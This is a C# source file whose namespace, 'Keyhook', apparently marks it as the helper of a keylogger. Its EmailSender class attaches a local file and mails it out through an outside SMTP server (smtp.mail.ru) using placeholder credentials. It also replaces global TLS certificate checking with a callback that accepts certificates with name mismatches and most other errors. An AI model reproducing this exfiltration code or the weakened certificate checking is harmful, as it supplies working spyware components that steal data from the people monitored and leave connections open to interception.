using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace Keyhook.Helpers
{
    public class EmailSender
    {
        public void Send(string filePath)
        {
            ServicePointManager.ServerCertificateValidationCallback = CertificateValidationCallBack;
            var fromAddress = new MailAddress("email", "Test");
            var toAddress = new MailAddress("email", "Test");
            const string fromPassword = "password";
            const string subject = "From";
            const string body = "Body";

            var message = new MailMessage("email", "email", "subject", "body");
            message.Attachments.Add(new Attachment(filePath));

            var client = new SmtpClient("smtp.mail.ru", 2525)
            {
                Credentials = new NetworkCredential("email", "password"),
                EnableSsl = true
            };
			
            client.SendCompleted += SendCompletedCallback;
            client.SendCompleted += (s, e) =>
            {
                client.Dispose();
                message.Dispose();
            };
            client.SendAsync(message, null);
        }

        private void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
        {
            // Get the unique identifier for this asynchronous operation.
            var token = (string)e.UserState;

            if (e.Cancelled)
            {
                Debugger.Log(1, "1", "Send canceled. " + token);
            }
            if (e.Error != null)
            {
                Debugger.Log(1, "1", token + " " + e.Error);
            }
            else
            {
                Debugger.Log(1, "1", "Message sent.");
            }
            //mailSent = true;
        }

        private static bool CertificateValidationCallBack(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {

            if ((sslPolicyErrors & SslPolicyErrors.RemoteCertificateChainErrors) != 0 && chain != null)
            {
                return chain.ChainStatus.Where(status =>
                    (certificate.Subject != certificate.Issuer)
                    || (status.Status != X509ChainStatusFlags.UntrustedRoot)).All(status => status.Status == X509ChainStatusFlags.NoError);
            }

            return true;
        }
    }
}